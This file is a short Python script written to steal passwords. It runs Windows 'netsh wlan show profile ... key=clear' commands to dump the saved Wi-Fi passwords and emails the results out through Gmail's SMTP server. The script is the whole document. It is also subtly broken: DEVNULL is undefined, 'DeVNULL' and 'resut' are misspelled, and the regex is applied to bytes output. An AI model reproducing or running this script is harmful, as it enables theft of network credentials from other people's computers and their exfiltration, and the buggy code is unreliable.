import subprocess, re, smtplib, os

def send_email(mail, password, message):
    host = smtplib.SMTP("smtp.gmail.com", 587)
    host.starttls()
    host.login(mail,password)
    host.sendmail(mail,mail,message)
    host.quit()




c1  = "netsh wlan show profile"
sub1 = subprocess.check_output(c1, shell=True, stderr=DEVNULL,stdin=DEVNULL)
regular_list = re.findall("(?:Benutzer\s:\s)(.*)",sub1)


result = ""

for regular in regular_list:
    c2 = "netsh wlan show profile " + regular + " key=clear"
    sub2 = subprocess.check_output(c2, shell=True, stderr=DeVNULL,stdin=DEVNULL)
    current_value = sub2
    resut = resut + current_value

send_email("login", "password", resut)
